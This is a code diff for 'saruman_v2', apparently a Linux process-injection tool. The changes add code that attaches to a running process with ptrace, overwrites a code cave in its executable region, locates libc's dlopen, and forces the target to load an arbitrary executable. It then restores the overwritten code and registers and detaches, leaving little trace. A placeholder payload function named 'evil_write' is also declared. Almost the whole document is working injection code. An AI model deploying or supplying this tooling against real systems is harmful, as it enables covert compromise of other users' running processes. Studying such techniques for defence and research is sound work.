@@ -1,5 +1,6 @@
 #include <sys/user.h>
 #include <sys/ptrace.h>
+#include <ctype.h>
 
 #include "saruman_v2.h"
 
@@ -15,8 +16,6 @@
 #define __PAYLOAD_ATTRIBUTES__	 __attribute__((aligned(8),__always_inline__))
 #define __PAYLOAD_KEYWORDS__ __PAYLOAD_ATTRIBUTES__ static inline volatile
 
-#define INIT_CODE_REGION 0x00C00000
-
 #define PT_CALL_REGION_SIZE 40960
 #define PT_CALL_REGION 0x000B0000
 
@@ -30,7 +29,11 @@ typedef struct saruman_ctx {
 	struct user_regs_struct o_pt_regs;
 	pid_t pid;
 	char *exec_path;
-	uint64_t base_vaddr;
+	uint64_t base_vaddr; // base address of executable at load-time
+	uint64_t libc_base_vaddr; // base address of libc at load-time
+	uint8_t *orig_code_cave; //backup of code in r-xp region of main executable
+	uint64_t orig_code_cave_addr;
+	size_t cave_len;
 	struct {
 		elfobj_t *elfobj;
 	} libc;
@@ -67,6 +70,8 @@ typedef struct saruman_rpc {
 	char **args;
 	int argc;
 	uint64_t retval;
+	struct user_regs_struct o_pt_regs;
+	struct user_regs_struct n_pt_regs;
 } saruman_rpc_t;
 
 #if defined DEBUG
@@ -89,9 +94,13 @@ typedef struct saruman_rpc {
  */
 #define __RTLD_DLOPEN 0x80000000 //glibc internal dlopen flag emulates dlopen behaviour
 
+
+__PAYLOAD_KEYWORDS__ size_t evil_write(long fd, void *buf, unsigned long len);
+
+
 __PAYLOAD_KEYWORDS__ void * dlopen_loader(const char *path, uint64_t dlopen_addr)
 {
-	void * (*libc_dlopen)(const char *, int) = (void *)dlopen_addr;
+	void * (*libc_dlopen)(const char *, int) = (void *)((uint64_t)dlopen_addr);
 	void *handle = (void *)0xfff; //initialized for debugging
 	handle = libc_dlopen(path, __RTLD_DLOPEN|RTLD_NOW|RTLD_GLOBAL);
 	__RETURN_VALUE__(handle);
@@ -331,6 +340,7 @@ bool saruman_ptrace_write(struct saruman_ctx *ctx,
 	unsigned char *d = (unsigned char *) dest;
 
 	while (quot-- != 0) {
+		saruman_debug("poking to %p\n", d);
 		if ( ptrace(PTRACE_POKEDATA, pid, d, *(void **)s) == -1 )
 			goto out_error;
 		s += sizeof(void *);
@@ -376,6 +386,7 @@ bool saruman_ptrace_read(struct saruman_ctx *ctx,
 	pid_t pid = ctx->task.pid;
 
 	while (sz-- != 0) {
+		saruman_debug("Reading from %p\n", src);
 		word = ptrace(PTRACE_PEEKTEXT, pid, s, NULL);
 		if (word == -1 && errno) {
 			fprintf(stderr, "saruman_ptrace_read() failed, pid: %d: %s\n", pid, strerror(errno));
@@ -418,7 +429,7 @@ saruman_ptrace_detach(saruman_ctx_t *ctx)
 	}
 	ctx->task.flags |= PT_DETACHED;
 	saruman_debug("[+] PT_TID_DETACHED -> %d\n", pid);
-	return 0;
+	return true;
 }
 
 bool
@@ -478,6 +489,40 @@ detach:
 	return false;
 }
 
+/*
+ * We use a code-cave to store the initial boot code. We must backup the original
+ * code.
+ */
+bool saruman_backup_cave(struct saruman_ctx *ctx, uint64_t cave_addr,
+    size_t cave_len)
+{
+	ctx->orig_code_cave = malloc(cave_len);
+
+	if (ctx->orig_code_cave == NULL) {
+		perror("malloc");
+		return false;
+	}
+
+	ctx->cave_len = cave_len;
+	ctx->orig_code_cave_addr = cave_addr;
+	if (saruman_ptrace_read(ctx, ctx->orig_code_cave, (void *)cave_addr, cave_len) == false) {
+		fprintf(stderr, "saruman_ptrace_read() failed on %#lx\n", cave_addr);
+		return false;
+	}
+
+	return true;
+}
+
+bool saruman_restore_cave(struct saruman_ctx *ctx)
+{               
+        if (saruman_ptrace_write(ctx, (void *)ctx->orig_code_cave_addr,
+	    ctx->orig_code_cave, ctx->cave_len) == false) {
+                fprintf(stderr, "saruman_ptrace_write() failed on %#lx\n", ctx->orig_code_cave_addr);
+                return false;
+        }       
+        return true;    
+}
+
 bool saruman_find_bootloader_cave(struct saruman_ctx *ctx)
 {
 	FILE *fp;
@@ -514,9 +559,40 @@ bool saruman_find_bootloader_cave(struct saruman_ctx *ctx)
 		    strtoul(buf, NULL, 16);
 		ctx->bootstrap.executable_len =
 		    strtoul((p + 1), NULL, 16) - ctx->bootstrap.executable_base_addr;
+		fclose(fp);
 		return true;
 	}
+	
+	fclose(fp);
+	return false;
+}
 
+bool saruman_find_libc_base(struct saruman_ctx *ctx)
+{
+	FILE *fp;
+	char path[4096], buf[4096];
+	char *p;
+
+	snprintf(path, 4096, "/proc/%d/maps", ctx->task.pid);
+	fp = fopen(path, "r");
+	if (fp == NULL) {
+		perror("fopen");
+		return false;
+	}
+
+	while (fgets(buf, sizeof(buf), fp) != NULL) {
+		if (ctx->libc_base_vaddr == 0 &&
+		    strstr(buf, "/lib/x86_64-linux-gnu/libc.so.6") != NULL) {
+			if (strstr(buf, "r--p") == NULL)
+				continue;
+			p = strchr(buf, '-');
+			*p = '\0';
+			ctx->libc_base_vaddr = strtoul(buf, NULL, 16);
+			fclose(fp);
+			return true;
+		}
+	}
+	fclose(fp);
 	return false;
 }
 
@@ -533,6 +609,15 @@ bool saruman_store_register_state(struct saruman_ctx *ctx)
 	return true;
 }
 
+bool saruman_restore_register_state(struct saruman_ctx *ctx)
+{
+	if (ptrace(PTRACE_SETREGS, ctx->task.pid, NULL, &ctx->o_pt_regs) < 0) {
+		perror("PTRACE_SETREGS");
+		return false;
+	}
+	return true;
+}
+
 void saruman_remote_call_init(struct saruman_rpc *rpc, void *fn, size_t fn_len,
     char **args, int argc) 
 {
@@ -540,7 +625,6 @@ void saruman_remote_call_init(struct saruman_rpc *rpc, void *fn, size_t fn_len,
 	rpc->fn_len = fn_len;
 	rpc->args = args;
 	rpc->argc = argc;
-
 	return;
 }
 
@@ -548,18 +632,28 @@ bool saruman_remote_call(struct saruman_ctx *ctx, struct saruman_rpc *rpc)
 {
 	bool res;
 	uint64_t addr;
-	struct user_regs_struct *pt_regs = &ctx->pt_regs;
 	int status;
+	struct user_regs_struct *pt_regs;
 
-	if (ptrace(PTRACE_GETREGS, ctx->task.pid, NULL, &ctx->pt_regs) < 0) {
+	if (ptrace(PTRACE_GETREGS, ctx->task.pid, NULL, &rpc->o_pt_regs) < 0) {
 		perror("ptrace");
 		return false;
 	}
+
+	memcpy(&rpc->n_pt_regs, &rpc->o_pt_regs, sizeof(struct user_regs_struct));
 
 	addr = ctx->bootstrap_phase_complete ?
 	    PT_CALL_REGION : ctx->bootstrap.executable_base_addr;
 
 	saruman_debug("Writing %zu bytes from %p to %#lx\n", rpc->fn_len, rpc->fn, addr);
+	
+	if (ctx->bootstrap_phase_complete == false) {
+		res = saruman_backup_cave(ctx, addr, rpc->fn_len);
+		if (res == false) {
+			fprintf(stderr, "saruman_backup_cave() failed\n");
+			return false;
+		}
+	}
 	res = saruman_ptrace_write(ctx, (void *)addr, rpc->fn, rpc->fn_len);
 	if (res == false) {
 		fprintf(stderr, "saruman_ptrace_write() failed on pid %d\n", ctx->task.pid);
@@ -568,7 +662,20 @@ bool saruman_remote_call(struct saruman_ctx *ctx, struct saruman_rpc *rpc)
 
 	saruman_debug("Setting pt_regs.rip to %#lx\n", addr);
 
-	ctx->pt_regs.rip = addr;
+	pt_regs = &rpc->n_pt_regs;
+	pt_regs->rip = addr;
+	if ((long)pt_regs->orig_rax >= 0) {
+		pt_regs->orig_rax = -1;
+	}
+	if (ctx->bootstrap_phase_complete == true) {
+		if ((ctx->stack.rsp % 16) != 8) {
+			saruman_debug("Re-aligning stack to 8 bit align\n");
+			ctx->stack.rsp -= 8;
+		}
+		pt_regs->rsp = ctx->stack.rsp; //SySv wants rsp % 16 == 8
+		saruman_debug("pt_regs->rsp is set to %#llx\n", pt_regs->rsp);
+	}
+
 	switch(rpc->argc) {
 	case 1:
 		pt_regs->rdi = (uintptr_t)rpc->args[0];
@@ -604,7 +711,25 @@ bool saruman_remote_call(struct saruman_ctx *ctx, struct saruman_rpc *rpc)
 		pt_regs->r9 =  (uintptr_t)rpc->args[5];
 		break;
 	}
-	if (ptrace(PTRACE_SETREGS, ctx->task.pid, NULL, &ctx->pt_regs) < 0) {
+
+#if DEBUG
+	if (ctx->bootstrap_phase_complete == true) {
+		int i;
+		char tmp[32];
+		saruman_ptrace_read(ctx, tmp, rpc->args[0], 16);
+		saruman_debug("tmp: %s\n", tmp);
+		saruman_debug("dlopen addr: %p\n", rpc->args[1]);
+		saruman_ptrace_read(ctx, tmp, rpc->args[1], 16);
+		for (i = 0; i < 16; i++)
+			printf("%02x", tmp[i] & 0xff);
+		printf("\n");
+	}
+#endif
+
+	/*
+	 * Set the new register state
+	 * */
+	if (ptrace(PTRACE_SETREGS, ctx->task.pid, NULL, &rpc->n_pt_regs) < 0) {
 		perror("ptrace setregs");
 		return false;
 	}
@@ -614,6 +739,12 @@ bool saruman_remote_call(struct saruman_ctx *ctx, struct saruman_rpc *rpc)
 	}
 	waitpid2(ctx->task.pid, &status, 0);
 
+	if (ptrace(PTRACE_GETREGS, ctx->task.pid, NULL, &rpc->n_pt_regs) < 0) {
+		perror("ptrace setregs");
+		return false;
+	}
+	saruman_debug("rip is set to: %#llx\n", rpc->n_pt_regs.rip);
+
 	if (WSTOPSIG(status) != SIGTRAP) {
 		fprintf(stderr,
 		    "[!] No SIGTRAP received, something went wrong. Signal: %d\n",
@@ -621,20 +752,52 @@ bool saruman_remote_call(struct saruman_ctx *ctx, struct saruman_rpc *rpc)
 		return false;
 	}
 	/* Get return value */
-	if (ptrace(PTRACE_GETREGS, ctx->task.pid, NULL, pt_regs) < 0) {
+	if (ptrace(PTRACE_GETREGS, ctx->task.pid, NULL, &rpc->n_pt_regs) < 0) {
 		perror("PTRACE_GETREGS");
-		return -1;
+		return false;
 	}
 	rpc->retval = pt_regs->rax;
+	/*
+	 * Restore the old register state back.
+	 */
+	if (ptrace(PTRACE_SETREGS, ctx->task.pid, NULL, &rpc->o_pt_regs) < 0) {
+		perror("ptrace setregs");
+		return false;
+	}
 	return true;
 }
 
+uint64_t saruman_push_string(struct saruman_ctx *ctx, char *string)
+{
+	size_t len = strlen(string) + 1;
+	size_t i;
+	bool res;
+
+	len = (len + 15) & ~15;
+
+	uint8_t *ptr = (uint8_t *)ctx->stack.rsp - len;
+
+	saruman_debug("Calling ptrace_write(), writing string '%s' to %p\n", string, ptr);
+
+	res = saruman_ptrace_write(ctx, ptr, string, len);
+	if (res == false) {
+		fprintf(stderr, "saruman_ptrace_write() failed on %d\n", ctx->task.pid);
+		exit(EXIT_FAILURE);
+	}
+	ctx->stack.rsp -= len;
+	return ctx->stack.rsp;
+}
+
+/*
+ * Call function: bootstrap_code(PT_CALL_REGION, PT_CALL_REGION_SIZE, NULL);
+ * remotely in the target process.
+ */
 bool saruman_run_bootstrap(struct saruman_ctx *ctx, uint64_t *retval)
 {
 	struct saruman_rpc rpc;
 
-	saruman_debug("Writing %zu bytes of bootstrap code into %p\n",
-	     4096, (void *)ctx->bootstrap.executable_base_addr);
+	saruman_debug("Writing %i bytes of bootstrap code into %p\n",
+	     1024, (void *)ctx->bootstrap.executable_base_addr);
 
 	char *argv[] = {(void *)PT_CALL_REGION, (void *)PT_CALL_REGION_SIZE, (void *)0x0};
 	saruman_remote_call_init(&rpc, &bootstrap_code, 1024, argv, 3);
@@ -669,7 +832,7 @@ bool saruman_find_libc_dlopen(struct saruman_ctx *ctx, uint64_t *value)
 		fprintf(stderr, "elf_symbol_by_name() failed on: \"dlopen\"\n");
 		return false;
 	}
-	symbol.value += ctx->base_vaddr;
+	symbol.value += ctx->libc_base_vaddr;
 	memcpy(value, &symbol.value, sizeof(uint64_t));
 	return true;
 }
@@ -680,6 +843,7 @@ int main(int argc, char **argv)
 	struct saruman_rpc rpc;
 	uint64_t retval, dlopen_addr;
 	bool res;
+	int i;
 
 	memset(&saruman, 0, sizeof(saruman));
 
@@ -688,24 +852,41 @@ int main(int argc, char **argv)
 		exit(EXIT_FAILURE);
 	}
 
+	for (i = 0; i < strlen(argv[1]); i++) {
+		if (!isdigit(argv[1][i])) {
+			fprintf(stderr, "Arg1 is should be a numerical PID\n");
+			exit(EXIT_FAILURE);
+		}
+	}
 	saruman.task.pid = atoi(argv[1]);
 	saruman.exec_path = strdup(argv[2]);
 	if (saruman.exec_path == NULL) {
 		perror("strdup");
 		exit(EXIT_FAILURE);
 	}
+	
+	fprintf(stdout, "Attaching to PID: %d\n", saruman.task.pid);
+	fprintf(stdout, "Injecting: %s\n", saruman.exec_path);
+
 	saruman.args.argv = &argv[2];
 	argc = argc - 1;
 
+	saruman_debug("PTRACE ATTACH\n");
 	if (saruman_ptrace_attach(&saruman) == false) {
 		fprintf(stderr, "saruman_ptrace_attach() failedon pid: %d\n",
 		    saruman.task.pid);
 		exit(EXIT_FAILURE);
 	}
 
+	saruman_debug("STORE REGISTER STATE\n");
 	if (saruman_store_register_state(&saruman) == false) {
 		fprintf(stderr, "saruman_store_register_state() failedon pid: %d\n",
 		    saruman.task.pid);
+		exit(EXIT_FAILURE);
+	}
+
+	if (saruman_find_libc_base(&saruman) == false) {
+		fprintf(stderr, "Failed to find libc.so.6 base address in memory\n");
 		exit(EXIT_FAILURE);
 	}
 
@@ -727,7 +908,9 @@ int main(int argc, char **argv)
 	saruman.stack.len = STACK_SIZE;
 	saruman.stack.base = (void *)retval;
 	saruman.stack.rsp = ((uint64_t)retval + saruman.stack.len);
+
 	printf("bootstrap complete, stack base: %p\n", saruman.stack.base);
+	printf("rsp initialized to %#lx\n", saruman.stack.rsp);
 	/*
 	 * Call dlopen_loader(exec_path, exec_args, parasite_argc)
 	 */
@@ -739,10 +922,36 @@ int main(int argc, char **argv)
 	}
 
 	printf("Calling dlopen_loader remotely, dlopen() is at %p\n", (void *)dlopen_addr);
-	char *dlopen_loader_args[] = {argv[2], (char *)dlopen_addr};
+	/*
+	 * Push the string onto the remote process stack that we initialized
+	 * in the bootstrap code. This is necessary for injected code to access
+	 * memory.
+	 */
+	char *exec_path = (char *)saruman_push_string(&saruman, argv[2]);
+	char *dlopen_loader_args[] = {exec_path, (char *)dlopen_addr};
 	saruman_remote_call_init(&rpc, &dlopen_loader, 1024,
 	    dlopen_loader_args, 2);
 	saruman_remote_call(&saruman, &rpc);
+
+	printf("Handle: %p\n", (void *)rpc.retval);
+	printf("Successfully injected executable '%s' into memory\n", argv[2]);
+	
+	if (saruman_restore_cave(&saruman) == false) {
+		fprintf(stderr, "Failed restoring code cave in text region of main executable\n");
+		exit(EXIT_FAILURE);
+	}
+
+	if (saruman_restore_register_state(&saruman) == false) {
+		fprintf(stderr, "Failed to restore register state with PTRACE\n");
+		exit(EXIT_FAILURE);
+	}
+
+	if (saruman_ptrace_detach(&saruman) == false) {
+		fprintf(stderr, "saruman_ptrace_detach() failed on %d\n", saruman.task.pid);
+		exit(EXIT_FAILURE);
+	}
+
+	exit(0);
 }
 
 
